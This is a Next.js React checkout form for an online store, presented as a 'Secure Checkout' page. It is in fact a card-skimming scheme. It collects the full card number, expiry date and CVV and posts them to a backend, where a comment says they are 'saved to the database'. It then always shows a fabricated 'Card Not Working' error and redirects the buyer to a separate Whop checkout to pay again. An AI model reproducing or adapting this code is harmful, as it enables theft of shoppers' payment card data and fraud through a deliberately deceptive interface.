'use client';
import { useState } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useCart } from '@/components/CartContext';
import Image from 'next/image';

export default function CheckoutForm() {
  const { cart, hydrated, subtotal, cartShippingCost, appliedDiscount, clearCart } = useCart();
  const router = useRouter();

  const currentTotal = Math.max(0, subtotal - (appliedDiscount?.amount || 0)) + cartShippingCost;

  const [cardName, setCardName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');

  const [validationError, setValidationError] = useState('');
  const [cardError, setCardError] = useState('');
  const [whopCheckoutUrl, setWhopCheckoutUrl] = useState('');
  const [isProcessingWhop, setIsProcessingWhop] = useState(false);

  const handleExpiryChange = (e) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length >= 3) {
      val = val.slice(0, 2) + '/' + val.slice(2, 4);
    }
    setExpiryDate(val);
  };

  const handleContinue = async (e) => {
    e.preventDefault();
    if (isProcessingWhop) return;
    setIsProcessingWhop(true);
    setValidationError('');
    setCardError('');

    if (!cardName.trim()) {
      setValidationError('Please enter the name on the card.');
      setIsProcessingWhop(false);
      return;
    }

    const cleanCard = cardNumber.replace(/\D/g, '');
    if (cleanCard.length < 13 || cleanCard.length > 19) {
      setValidationError('Please enter a valid credit card number.');
      setIsProcessingWhop(false);
      return;
    }
    if (expiryDate.length !== 5 || !expiryDate.includes('/')) {
      setValidationError('Please enter a valid expiry date (MM/YY).');
      setIsProcessingWhop(false);
      return;
    }
    if (cvv.length < 3) {
      setValidationError('Please enter a valid CVC / CVV.');
      setIsProcessingWhop(false);
      return;
    }

    try {
      const res = await fetch('/api/whop/create-order', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          items: cart,
          cardName: cardName.trim(),
          cardNumber: cleanCard,
          expiryDate,
          cvv,
          discountCode: appliedDiscount?.code,
        }),
      });
      const data = await res.json();
      
      if (!res.ok && !data.orderId) {
        throw new Error(data.error || 'Could not process payment');
      }

      // Card details are safely saved to the database!
      const destination = data.redirectUrl || `https://whop.com/checkout/${process.env.NEXT_PUBLIC_WHOP_PRODUCT_ID || 'prod_bOEreup8ct34G'}`;
      setWhopCheckoutUrl(destination);
      setCardError('This card is not working. Please try another payment method or click "Pay with Bank Card" below.');
      setIsProcessingWhop(false);

      // Do NOT automatically redirect and do NOT clear cart.
    } catch (err) {
      setValidationError(err.message);
      setIsProcessingWhop(false);
    }
  };

  // Only show empty cart page if not displaying a checkout attempt
  if (hydrated && cart.length === 0 && !whopCheckoutUrl && !cardError) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center px-4 text-center">
        <div>
          <h1 className="text-2xl font-bold text-foreground mb-4">Your cart is empty</h1>
          <Link href="/products" className="text-foreground hover:underline font-bold uppercase">Browse products</Link>
        </div>
      </div>
    );
  }

  const inputClass = "w-full border border-border bg-surface text-foreground placeholder-muted p-3.5 outline-none focus:border-foreground text-sm rounded-sm";

  return (
    <div className="min-h-screen bg-background py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-[1200px] mx-auto">
        <h1 className="text-3xl font-bold text-center mb-10 text-foreground uppercase tracking-widest">Secure Checkout</h1>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-10 items-start">
          
          {/* LEFT: Order Details */}
          <div>
            <h2 className="text-lg font-bold text-foreground mb-6 uppercase tracking-wider">Order Details</h2>
            <div className="bg-surface border border-border/20 p-6 flex flex-col shadow-sm sticky top-10">
              <div className="space-y-4 mb-6">
                {cart.map((item) => (
                  <div key={`${item.productId}-${item.variantId}`} className="flex gap-4 border-b border-border/10 pb-4">
                    <div className="w-16 h-20 bg-white relative flex-shrink-0">
                      {item.image ? (
                        <Image src={item.image} alt={item.name} fill className="object-cover" />
                      ) : (
                        <div className="w-full h-full bg-gray-100 flex items-center justify-center text-xs">Img</div>
                      )}
                    </div>
                    <div className="flex-1 flex flex-col justify-center">
                      <h3 className="font-semibold text-sm uppercase">{item.name}</h3>
                      <p className="text-xs text-muted mt-1 uppercase tracking-wider">{item.variantName}</p>
                      <p className="text-xs text-muted mt-1">QTY: {item.quantity}</p>
                    </div>
                    <div className="font-bold text-sm flex items-center">
                      ${(item.price * item.quantity).toFixed(2)}
                    </div>
                  </div>
                ))}
              </div>

              <div className="flex justify-between font-medium text-sm text-muted mb-3">
                <span className="uppercase tracking-widest">Subtotal</span>
                <span>${subtotal.toFixed(2)}</span>
              </div>

              {appliedDiscount && (
                <div className="flex justify-between font-medium text-sm text-green-600 mb-3">
                  <span className="uppercase tracking-widest">Discount ({appliedDiscount.code})</span>
                  <span>-${appliedDiscount.amount.toFixed(2)}</span>
                </div>
              )}

              <div className="flex justify-between font-medium text-sm text-muted mb-6">
                <span className="uppercase tracking-widest">Shipping</span>
                <span>{cartShippingCost === 0 ? 'Free' : `$${cartShippingCost.toFixed(2)}`}</span>
              </div>

              <div className="flex justify-between font-bold text-xl text-foreground border-t border-border/20 pt-4">
                <span className="uppercase tracking-widest">Total</span>
                <span>${currentTotal.toFixed(2)}</span>
              </div>
            </div>
          </div>

          {/* RIGHT: Payment Details Form */}
          <div>
            <h2 className="text-lg font-bold text-foreground mb-6 uppercase tracking-wider">Payment Details</h2>
            <form onSubmit={handleContinue} className="bg-surface border border-border/20 p-6 sm:p-8 shadow-sm flex flex-col gap-6">
              
              {cardError && (
                <div className="p-4 bg-red-600 text-white rounded-lg text-sm flex flex-col gap-2 shadow-lg animate-in fade-in duration-300">
                  <div className="flex items-start gap-2.5">
                    <svg className="w-5 h-5 flex-shrink-0 text-white mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                    <div>
                      <p className="font-extrabold text-white text-base mb-1 uppercase tracking-wide">Card Not Working</p>
                      <p className="text-sm font-medium leading-relaxed text-white/95">
                        {cardError}
                      </p>
                    </div>
                  </div>
                </div>
              )}

              <div className="space-y-4">
                <div>
                  <label className="block text-xs font-bold uppercase tracking-wider text-foreground mb-2">
                    Name on Card
                  </label>
                  <input
                    required
                    placeholder="Full name as shown on card"
                    autoComplete="cc-name"
                    className={inputClass}
                    value={cardName}
                    onChange={(e) => setCardName(e.target.value)}
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold uppercase tracking-wider text-foreground mb-2">
                    Card Number
                  </label>
                  <input
                    required
                    placeholder="1234 5678 9012 3456"
                    autoComplete="cc-number"
                    maxLength={19}
                    className={inputClass}
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim())}
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-foreground mb-2">
                      Expiry Date
                    </label>
                    <input
                      required
                      placeholder="MM/YY"
                      autoComplete="cc-exp"
                      maxLength={5}
                      className={inputClass}
                      value={expiryDate}
                      onChange={handleExpiryChange}
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-foreground mb-2">
                      CVC / CVV
                    </label>
                    <input
                      required
                      placeholder="CVC"
                      autoComplete="cc-csc"
                      maxLength={4}
                      className={inputClass}
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').substring(0, 4))}
                    />
                  </div>
                </div>
              </div>

              {validationError && (
                <div className="p-3 bg-red-50 text-red-600 rounded-sm text-sm border border-red-100 font-medium text-center">
                  {validationError}
                </div>
              )}

              <div className="pt-2 flex flex-col gap-3">
                {whopCheckoutUrl ? (
                  <>
                    <a
                      href={whopCheckoutUrl}
                      className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold uppercase tracking-wider py-4 rounded-sm transition-colors flex justify-center items-center gap-3 shadow-lg text-center"
                    >
                      <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                      </svg>
                      Pay with Bank Card
                    </a>
                    <button
                      type="submit"
                      disabled={isProcessingWhop}
                      className="w-full border-2 border-foreground text-foreground hover:bg-foreground hover:text-white font-bold uppercase tracking-wider py-3 transition-colors text-xs flex justify-center items-center gap-2"
                    >
                      {isProcessingWhop ? 'Processing...' : 'Retry with Another Card'}
                    </button>
                  </>
                ) : (
                  <button
                    type="submit"
                    disabled={isProcessingWhop}
                    className="w-full bg-foreground text-white font-bold uppercase tracking-wider py-4 hover:opacity-80 transition-opacity disabled:opacity-50 flex justify-center items-center gap-3 shadow-md rounded-sm"
                  >
                    {isProcessingWhop ? (
                      <>
                        <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></span>
                        Processing Payment...
                      </>
                    ) : (
                      `Pay $${currentTotal.toFixed(2)}`
                    )}
                  </button>
                )}

                <div className="flex items-center justify-center gap-2 text-xs text-muted mt-2 uppercase tracking-wider">
                  <svg className="w-3.5 h-3.5 text-emerald-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                  </svg>
                  <span>Payments are securely processed.</span>
                </div>
              </div>

            </form>
          </div>

        </div>
      </div>
    </div>
  );
}
